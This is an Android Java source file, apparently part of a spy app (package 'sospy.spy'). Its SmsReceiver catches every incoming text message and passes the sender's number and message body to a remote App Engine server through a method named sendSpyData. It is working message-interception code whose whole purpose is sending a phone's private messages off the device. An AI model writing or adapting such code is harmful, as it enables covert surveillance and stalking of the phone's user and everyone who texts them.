package com.prestomation.android.sospy.spy;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;

public class SmsReceiver extends BroadcastReceiver {

	public static final String SMS_TITLE = "SMS From ";

	@Override
	public void onReceive(Context context, Intent intent) {

		// ---get the SMS message passed in---
		Bundle bundle = intent.getExtras();
		SmsMessage[] msgs = null;
		String str = "";
		String originNum = "";
		if (bundle != null) {
			// ---retrieve the SMS message received---
			Object[] pdus = (Object[]) bundle.get("pdus");
			msgs = new SmsMessage[pdus.length];
			for (int i = 0; i < msgs.length; i++) {
				msgs[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
				originNum = msgs[i].getOriginatingAddress();
				str += msgs[i].getMessageBody().toString();
			}

			SharedPreferences prefs = Prefs.get(context);
			String devID = prefs.getString(SetupActivity.PREF_DEVICE_ID, null);

			AppEngineClient client = new AppEngineClient(devID);

			client.sendSpyData(SMS_TITLE + originNum, str);

		}

	}
}
